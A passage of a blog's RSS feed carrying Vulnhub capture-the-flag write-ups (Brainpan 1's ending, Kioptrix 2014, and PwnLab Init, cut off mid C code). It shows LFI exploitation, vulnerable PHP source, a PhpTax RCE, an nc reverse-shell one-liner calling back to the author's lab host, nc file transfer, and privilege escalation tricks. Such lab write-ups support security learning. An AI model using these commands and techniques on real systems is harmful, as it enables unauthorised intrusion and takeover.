&lt;img src=&quot;remoteShell1.png&quot; alt=&quot;Remote shell 1&quot; /&gt;
&lt;img src=&quot;remoteShell2.png&quot; alt=&quot;Remote shell 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running sudo -l we can see that puck can run a script as root without suppling the password. This script has three functions (network, proclist and manual). The manual function runs the man command with the argument that we supply.
&lt;img src=&quot;sudoPuck.png&quot; alt=&quot;Sudo -l&quot; /&gt;
&lt;img src=&quot;functions.png&quot; alt=&quot;Functions&quot; /&gt;
The man command uses a pager to show the manual and this pager allows us to run commands. I won’t explain the method but &lt;a href=&quot;https://gtfobins.github.io/gtfobins/man/&quot;&gt;I’ll leave a link to it&lt;/a&gt;.
&lt;img src=&quot;privesc.png&quot; alt=&quot;privesc&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;This is a really fun and a bit difficult machine that helped me practising buffer overflow. I’ve learnt about the NOP sled technique and the importance of having a Windows VM to test programs in there (I’ll work on this in the future).&lt;/p&gt;
</description>
        <pubDate>Mon, 03 Aug 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/brainpan_1_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/brainpan_1_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Kioptrix: 2014 Write-Up</title>
        <description>&lt;p&gt;Kioptrix: 2014 is an intermediate OSCP-like machine hosted on Vulnhub and the fifth one in the Kioptrix series.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;To get the IP of the machine I used Nmap’s ping scan to sweep the network.
&lt;img src=&quot;networkScan.png&quot; alt=&quot;Network Scan&quot; /&gt;
192.168.56.10 is the IP of my machine, so 192.168.56.130 is the target.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan and NSE Output&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;Port Scan&quot; /&gt;
There are three ports in the port scanning results, but only 80 and 8080 are open.
&lt;img src=&quot;NSEOut.png&quot; alt=&quot;NSE Out&quot; /&gt;
Here we can see that the machine is using FreeBSD and the webserver has mod_ssl 2.2.21, which was vulnerable in another machine in the Kioptrix series (the exploit didn’t work this time).
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
&lt;p&gt;In the root page of the web server we can see that the server is hosting pChart 2.1.3, which is a php webapp to make charts and it is &lt;a href=&quot;https://www.exploit-db.com/exploits/31173&quot;&gt;vulnerable to LFI&lt;/a&gt;.
&lt;img src=&quot;rootPage80.png&quot; alt=&quot;Root page 80&quot; /&gt;
Using the example HTTP request on ExploitDB I could read the /etc/passwd file but I didn’t find anything interesting there (except that there is a HIDS installed).&lt;br /&gt;
After modifying the HTTP request I read the configuration files for both the SSHD and the Apache services.
&lt;img src=&quot;LFIpasswd.png&quot; alt=&quot;LFI passwd&quot; /&gt;
&lt;img src=&quot;aconfigloc.png&quot; alt=&quot;Apache config location&quot; /&gt;
In the Apache configuration file we can see that the port 8080 virtual host only accepts connections that have the “UserAgent” header field set to “Mozilla/4.0”.
&lt;img src=&quot;aconfigcode.png&quot; alt=&quot;Apache config code&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;Port 8080 Enumeration&lt;/h1&gt;
&lt;p&gt;I used the BurpSuite proxy to rewrite the UserAgent of all my requests to enumerate manually the port 8080 virtual host. 
&lt;img src=&quot;phptax.png&quot; alt=&quot;Php Tax is installed&quot; /&gt;
PhpTax is installed in the server and it has a &lt;a href=&quot;https://www.exploit-db.com/exploits/21665&quot;&gt;Remote Code Execution (RCE) vulnerability&lt;/a&gt;. I couldn’t find the installed version (I didn’t install it in my machine to check the files) but I found that the vulnerability was working after doing some tweaks to the HTTP request.&lt;/p&gt;
&lt;h1&gt;RCE Exploitation&lt;/h1&gt;
&lt;p&gt;To exploit the RCE I used a one liner to spawn a reverse shell using nc:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 192.168.56.10 1234 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;revShell1.png&quot; alt=&quot;Reverse Shell 1&quot; /&gt;
&lt;img src=&quot;revShell2.png&quot; alt=&quot;Reverse Shell 2&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;Running uname I found that the machine was using FreeBSD 9.0, which has two registered kernel exploits in ExploitDB. 
&lt;img src=&quot;kernel.png&quot; alt=&quot;Kernel exploit&quot; /&gt;
I used the second one, to get it I runned “searchsploit -m exploits/freebsd/local/26368.c” in my local machine and then I uploaded it using nc, as wget and curl weren’t installed in the target. The commands I used were:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;(Local) nc -lnvp 5678 &amp;lt; exploit.c #Used to setup the server&lt;/li&gt;
  &lt;li&gt;(Target) nc 192.168.56.10 5678 &amp;gt; exploit.c #Connect to the server and save the output to exploit.c
Finally I compiled it and executed it in the target machine.
&lt;img src=&quot;root.png&quot; alt=&quot;PrivEsc to Root&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;I found this machine pretty easy, maybe because I had solved similar machines in the past. It was really frustating to use the reverse shell as the machine didn’t have Python installed and I couldn’t upgrade it to a more interactive shell. Fortunatelly the privilege escalation part was only executing a kernel exploit and it didn’t require much work on the remote machine.&lt;br /&gt;&lt;br /&gt;
I’ve been practising buffer overflow and I’ve done some HackTheBox write-ups (I can’t upload them right now because the machines are still active), this is why I didn’t post anything in such a long time.&lt;/p&gt;
</description>
        <pubDate>Fri, 31 Jul 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/kioptrix_2014_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/kioptrix_2014_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>PwnLab: Init Write-Up</title>
        <description>&lt;p&gt;PwnLab is really easy boot to root VM hosted on Vulnhub. This is the last easy machine in the &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;abatchys list&lt;/a&gt;
(I don’t have the write-ups for the first four levels of Kioptrix, but I don’t feel like doing them again just for the write-up). The goal is to get root in the machine and read the flag.&lt;/p&gt;
&lt;h1&gt;Network Scan&lt;/h1&gt;
&lt;p&gt;As always I used Nmap to do a ping scan on the entire subnet and get the IP of the vulnerable box.
&lt;img src=&quot;networkscan.png&quot; alt=&quot;Network Scan&quot; /&gt;
In this case, the IP was 192.168.56.129
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;Doing the port scan (using Nmap again) we can see that there aren’t a lot open ports. The most interesting ones are 80 and 3306 (HTTP and MySQL). I couldn’t find what was in port 54852, but it wasn’t necessary to get the foothold.
&lt;img src=&quot;portscan.png&quot; alt=&quot;Port Scan&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Web Enumeration&lt;/h1&gt;
&lt;p&gt;From the Nmap default scripts output we can see that the port 80 has an Apache 2.4.10 webserver, which doesn’t appear to be vulnerable to anything.&lt;br /&gt;
Running gobuster we can see some php pages, being the config.php the most interesting one because usually configuration files contain credentials.
&lt;img src=&quot;gobust.png&quot; alt=&quot;Gobuster&quot; /&gt;
In the webserver we can see the following pages:
&lt;img src=&quot;rootDir.png&quot; alt=&quot;rootDir&quot; /&gt;
&lt;img src=&quot;loginPage.png&quot; alt=&quot;Login page&quot; /&gt;
The login page isn’t vulnerable to SQL Injection, but the root page is vulnerable to Local File Inclusion (LFI). Using &lt;a href=&quot;https://highon.coffee/blog/lfi-cheat-sheet/&quot;&gt;a trick that I found on the Internet&lt;/a&gt; I was able to read the source code for all the php files.&lt;/p&gt;
&lt;h3&gt;Contents of config.php:&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;LFIconfig1.png&quot; alt=&quot;LFI Config 1&quot; /&gt;
&lt;img src=&quot;LFIconfig2.png&quot; alt=&quot;LFI Config 2&quot; /&gt;
Here we can read the credentials of the root user in the MySQL database.&lt;/p&gt;
&lt;h3&gt;Contents of index.php:&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//Multilingual. Not implemented yet.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lang'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lang/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lang'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Not implemented yet.&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;PwnLab Intranet Image Hosting&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;images/pwnlab.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
[ &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; ] [ &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;?page=login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; ] [ &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;?page=upload&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Upload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; ]
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr/&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'page'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'page'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Use this server to upload and share image files inside the intranet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we can see two sources of LFI, the first one being the lang cookie and the second one being the page GET argument. The one in the cookie allows us to include files with an extension different from .php.&lt;/p&gt;
&lt;h3&gt;Contents of login.php:&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pass'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$luser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$lpass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pass'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mysqli&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;bind_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ss'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$luser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$lpass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;store_Result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;num_rows&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$luser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Location: ?page=upload'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login failed.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&amp;gt;&lt;/span&gt;Username: &lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&amp;gt;&lt;/span&gt;Password: &lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Reading the source code we can confirm that it isn’t vulnerable to SQL Injection and that the passwords are base 64 encoded inside of the database.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;MySQL Enumeration&lt;/h1&gt;
&lt;p&gt;We can access the MySQL server using the credentials inside of the config.php file. 
&lt;img src=&quot;mysql1.png&quot; alt=&quot;Accessing mysql&quot; /&gt;
There is only one interesting database with a single table which has the usernames and the passwords for the website login page (in base 64).
&lt;img src=&quot;mysql2.png&quot; alt=&quot;MySQL 2&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Remote Code Execution (Low Privilege Shell)&lt;/h1&gt;
&lt;p&gt;We get access to the upload page once we log in. From here we can upload a php reverse shell disguised as a GIF image to bypass the file type restrictions (I explained this method in the FristiLeaks 1.3 Write-Up).&lt;br /&gt;
Once we upload the shell, we can get its path inside of the source code.
&lt;img src=&quot;shellupload.png&quot; alt=&quot;Uploading shell&quot; /&gt;
&lt;img src=&quot;shellpath.png&quot; alt=&quot;Shell path&quot; /&gt;
Using the LFI in the lang cookie we can execute the reverse shell.
&lt;img src=&quot;lfi2rce.png&quot; alt=&quot;LFI2RCE&quot; /&gt;
&lt;img src=&quot;lowshell.png&quot; alt=&quot;lowshell&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Mike&lt;/h1&gt;
&lt;p&gt;Both Kent and Kane use the same credentials as they did in the webpage, so we can use the “su” command to change our user. Kent doesn’t have anything useful, but Kane has a SetUID binary in the home directory.
&lt;img src=&quot;msgmike.png&quot; alt=&quot;msgmike&quot; /&gt;
If we decompile the binary, we can see that is executing “cat /home/mike/msg.txt”.
&lt;img src=&quot;msgmikedecomp.png&quot; alt=&quot;msgmike decompiled&quot; /&gt;
As the binary is executing “cat” using a relative path, we can create a script called “cat” in a directory which is in our PATH environment variable to execute our code instead of the intended one.
&lt;img src=&quot;mikeprivesc.png&quot; alt=&quot;privesc to mike&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
&lt;p&gt;In the Mikes home directory we can see another SetUID binary, but this one is owned by root.
&lt;img src=&quot;msg2root.png&quot; alt=&quot;msg2root&quot; /&gt;
Decompiling the binary we can see that it uses asprintf(“/bin/echo %s » root.txt”,…), so we can inject our code in there.
&lt;img src=&quot;msg2rootdecomp.png&quot; alt=&quot;msg2root decompiled&quot; /&gt;
In this case, I decided to compile a C program that executes “/bin/bash” as root (I know that there are easier ways, but I wanted to try this).&lt;br /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
